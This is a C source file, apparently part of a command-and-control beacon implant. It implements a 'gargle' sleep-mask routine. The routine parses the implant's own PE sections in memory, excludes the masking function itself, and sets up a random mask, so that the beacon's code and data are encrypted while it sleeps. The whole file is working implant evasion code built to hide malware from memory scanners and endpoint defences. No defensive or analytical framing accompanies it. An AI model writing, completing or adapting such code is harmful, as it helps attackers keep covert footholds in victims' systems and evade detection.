/* gargle! */
#include <windows.h>
#include <stdlib.h>
#include <string.h>
#include "crypto.h"
#include "beacon.h"
#include "gargleint.h"

void   * gtrampoline = NULL;
GARGLEP * gparms = NULL;

/* Synthesize the mask table from OUR OWN in-memory PE layout instead of
 * consuming the layout-blind table the generator publishes (it is computed
 * for the official sleeve's section map - applied to our DLL, its offsets
 * landed on .pdata CRT unwind entries and fail-fasted the process; see
 * docs/SLEEP-MASK-FEEDBACK.md).
 *
 * Policy: mask the header page plus .text/.rdata/.data; skip
 * .pdata/.fptable/.reloc. [xbegin,xend) is an optional absolute-address
 * exclusion for the mask function itself (the trampoline path executes
 * from our own .text and must never mask the code it is running). */
static DWORD gargle_own_sections(GARGLEP * gp, void * xbegin, void * xend) {
	static DWORD own[70]; /* header pair + 16 sections, each split at most once */
	unsigned short lfanew, optsize, nsec;
	unsigned int i, imgsz;
	DWORD count = 1;
	DWORD span = 0x1000;
	unsigned int xb = 0, xe = 0;
	int have_excl;

	if (gp == NULL || gp->beacon_ptr == NULL)
		return 0;
	if (gp->beacon_ptr[0] != 'M' || gp->beacon_ptr[1] != 'Z')
		return 0;
	memcpy(&lfanew, gp->beacon_ptr + 0x3C, sizeof(lfanew));
	memcpy(&optsize, gp->beacon_ptr + lfanew + 20, sizeof(optsize));
	memcpy(&nsec, gp->beacon_ptr + lfanew + 6, sizeof(nsec));
	memcpy(&imgsz, gp->beacon_ptr + lfanew + 24 + 0x50, sizeof(imgsz));
	if (lfanew == 0 || lfanew >= 0x400 || optsize < 0xD0 || optsize >= 0x400 ||
			nsec == 0 || nsec > 16 || imgsz == 0 || imgsz > 0x10000000)
		return 0;

	have_excl = 0;
	if (xbegin != NULL && xend != NULL) {
		unsigned long long a = (unsigned long long)(DWORD_PTR)xbegin;
		unsigned long long b = (unsigned long long)(DWORD_PTR)xend;
		unsigned long long base = (unsigned long long)(DWORD_PTR)gp->beacon_ptr;
		if (a > b) { unsigned long long t = a; a = b; b = t; }
		if (b > base && a < base + imgsz) {
			xb = (unsigned int)(a - base);
			xe = (unsigned int)(b - base);
			have_excl = 1;
		}
	}

	own[0] = 0;
	own[1] = 0x1000;
	for (i = 0; i < nsec && count < 34; i++) {
		char * sh = gp->beacon_ptr + lfanew + 24 + optsize + i * 40;
		unsigned int vs, va, ve;
		char nm[9];
		memcpy(nm, sh, 8);
		nm[8] = 0;
		if (strcmp(nm, ".pdata") == 0 || strcmp(nm, ".fptable") == 0 ||
				strcmp(nm, ".reloc") == 0)
			continue;
		memcpy(&vs, sh + 8, 4);
		memcpy(&va, sh + 12, 4);
		if (va < 0x1000 || va >= imgsz || vs == 0)
			continue;
		if (va + vs > imgsz)
			vs = imgsz - va;
		ve = va + vs;

		if (have_excl && xe > va && xb < ve) {
			/* split around the mask-function code */
			if (xb > va && count < 34) {
				own[count * 2] = va;
				own[count * 2 + 1] = xb;
				if (xb > span)
					span = xb;
				count++;
			}
			if (xe < ve && count < 34) {
				own[count * 2] = xe;
				own[count * 2 + 1] = ve;
				if (ve > span)
					span = ve;
				count++;
			}
			continue;
		}

		own[count * 2] = va;
		own[count * 2 + 1] = ve;
		if (ve > span)
			span = ve;
		count++;
	}
	if (count <= 1)
		return 0;
	own[count * 2] = 0;
	own[count * 2 + 1] = 0;
	gp->sections = own;
	return span;
}

void gargle_setup_parms(void * begin, void * end, int mask_fn_in_beacon) {
	DWORD * index;
	DWORD a, b, temp;

	if (gparms != NULL)
		return;

	gparms = (GARGLEP *)malloc(sizeof(GARGLEP));
	track_memory_add(gparms, sizeof(GARGLEP), TRACK_MEMORY_MALLOC, FALSE, NULL);
	gparms->beacon_ptr = (char *)get_beacon_ptr();
	gparms->sections = (DWORD *)setting_ptr(SETTING_GARGLE_SECTIONS);
	gparms->heap_records = NULL; /* this is reset for each sleep. */

	/* update place holder addresses in the sections, so the sleep mask function
	 * will not be masked.
	 */
	index = gparms->sections;
	if (index == NULL) {
		static DWORD empty_sections[2] = { 0, 0 };
		gparms->sections = empty_sections;
	}
	else {
	 while (TRUE) {
		a = *index; b = *(index + 1);
		if (a == 0 && b == 0) {
			break;
		}
		if (a == -1 || b == -1) {
			if (!mask_fn_in_beacon) {
				/* Sleep-mask BOF is a separate alloc; do not treat -1 as a
				 * 32-bit offset from beacon_ptr (truncates and self-masks). */
				a = 0;
				b = 0;
				memcpy(index, &a, sizeof(DWORD));
				memcpy(index + 1, &b, sizeof(DWORD));
				break;
			}
		}
		if (a == -1) {
			temp = (DWORD)((DWORD_PTR)end - (DWORD_PTR)gparms->beacon_ptr);
			memcpy(index, &temp, sizeof(DWORD));
			a = *index;
		}
		if (b == -1) {
			temp = (DWORD)((DWORD_PTR)begin - (DWORD_PTR)gparms->beacon_ptr);
			memcpy(index + 1, &temp, sizeof(DWORD));
			b = *(index + 1);
		}
		index += 2; /* goto the next section */
	}
	}
	/* Replace the generator-published layout with our own PE section ranges
	 * (all gargle consumers route through here: the sleepmask BOF path, the
	 * 4.5 trampoline fallback and the pivot block/wait masks). On the
	 * trampoline path the mask function executes from our own .text - its
	 * [begin,end) span is excluded so it can never mask itself. If our
	 * headers somehow fail to parse we keep the delivered table above. */
	if (mask_fn_in_beacon)
		gargle_own_sections(gparms, begin, end);
	else
		gargle_own_sections(gparms, NULL, NULL);

	crypto_rng_get_bytes((unsigned char *)gparms->mask, sizeof(gparms->mask));
}

void gargle_trampoline(void * end, void * begin) {
	if (gtrampoline != NULL)
		return;
	gtrampoline = begin;
	gargle_setup_parms(begin, end, 1);
}
